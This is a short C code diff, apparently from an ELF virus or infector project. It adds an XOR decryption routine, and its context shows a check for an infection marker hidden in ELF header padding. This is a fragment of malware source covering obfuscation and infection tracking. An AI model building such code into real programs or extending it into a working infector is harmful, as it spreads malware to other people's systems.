@@ -34,6 +34,12 @@ __attribute__((always_inline)) static inline bool is_infected(const struct s_hos
 	return *(unsigned int *)((char *)&host->header->e_ident[EI_PAD]) == PWN_MAGIC_NUMBER;
 }
 
+__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
+{
+	for (register size_t index = 0; index < size; index++)
+		callee[index] ^= keychain->key[LEFT];
+}
+
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
